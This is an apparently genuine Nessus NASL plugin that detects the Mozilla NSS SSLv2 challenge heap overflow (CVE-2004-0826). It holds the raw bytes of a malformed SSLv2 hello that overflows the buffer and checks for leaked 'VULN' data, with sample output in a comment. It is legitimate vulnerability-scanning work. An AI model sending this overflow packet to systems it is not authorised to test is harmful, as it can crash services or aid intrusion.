#
# This script was written by H D Moore <hdmoore@digitaldefense.net>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (8/5/09)
# - Updated to use compat.inc (11/20/2009)


include("compat.inc");

if(description)
{
	script_id(14361);
	script_version("$Revision: 1.12 $");

	script_cve_id("CVE-2004-0826");
	script_bugtraq_id(11015);
    	script_xref(name:"IAVA", value:"2004-t-0026");
    	script_xref(name:"OSVDB", value:"9116");

	script_name(english:"Netscape NSS Library SSLv2 Challenge Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote service is susceptible to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be using the Mozilla Network Security
Services (NSS) Library, a set of libraries designed to support the
development of security-enabled client/server applications. 

There seems to be a flaw in the remote version of this library, in the
SSLv2 handling code, that may allow an attacker to cause a heap
overflow and therefore execute arbitrary commands on the remote host. 
To exploit this flaw, an attacker needs to send a malformed SSLv2
'hello' message to the remote service." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?844b4085" );
 script_set_attribute(attribute:"solution", value:
"Upgrade the remote service to use NSS 3.9.2 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
	script_summary(english:"Tests for the NSS SSLv2 challenge overflow");
	script_category(ACT_MIXED_ATTACK);
	script_copyright(english:"This script is Copyright (C) 2004-2009 Digital Defense");
	script_family(english:"Gain a shell remotely");
        script_dependencies("http_version.nasl");
	script_require_keys("Transport/SSL");
	exit(0);
}



port = get_kb_item("Transport/SSL");
if(!port)exit(0);
if(!get_port_state(port))exit(0);


# Grab the HTTP banner if this is a http service
sb = string("www/real_banner/", port);
banner = get_kb_item(sb);

if (! banner ) {
      sb = string("www/banner/", port);
      banner = get_kb_item(sb);
}

if ( safe_checks() ) 
	TestOF = 0;
else 
	TestOF = 1;

if ( banner )
{
 if ( egrep(pattern:".*(Netscape.Enterprise|Sun-ONE).*", string:banner) )
	TestOF ++;
}


if ( ! TestOF ) exit(0);



soc = open_sock_tcp(port, transport:ENCAPS_IP);
if(!soc)exit(0);

# First we try a normal hello
req = raw_string(0x80, 0x1c, 0x01, 0x00, 
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x10, 0x07,
                 0x00, 0xc0) 
                 + crap(16, "NESSUS");

send(socket:soc, data:req);
res = recv(socket:soc, length:64);

# SSLv2 servers should respond back with the certificate at this point
if (strlen(res) < 64) exit(0);

close(soc);

# Now we try to overwrite most of the SSL response packet
# this should result in some of our data leaking back to us

soc = open_sock_tcp(port, transport:ENCAPS_IP);
if(!soc)exit(0);

req = raw_string(0x80, 0x44, 0x01, 0x00, 
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x38, 0x07,
                 0x00, 0xc0) 
                 + crap(16, data:"NESSUS")
                 + crap(40, data:"VULN");

send(socket:soc, data:req);
res = recv(socket:soc, length:2048);
close(soc);

# display(res);


if ( "VULN" >< res ) {
    security_hole(port:port);
}

#-- contents of res after test --
#$ nasl DDI_NSS_SSLv2_Challenge_Overflow.nasl -t 192.168.50.192
#** WARNING : packet forgery will not work
#** as NASL is not running as root
#.....
#8.?.....
#(/..5._.2..I....S@J\i.......wK..H.....v4.o..T.......f......3V>.o.l.O."....X.G..:G7.....9a...... ....V...t.Sf
#|....8...VULNVULNVULNVULNh

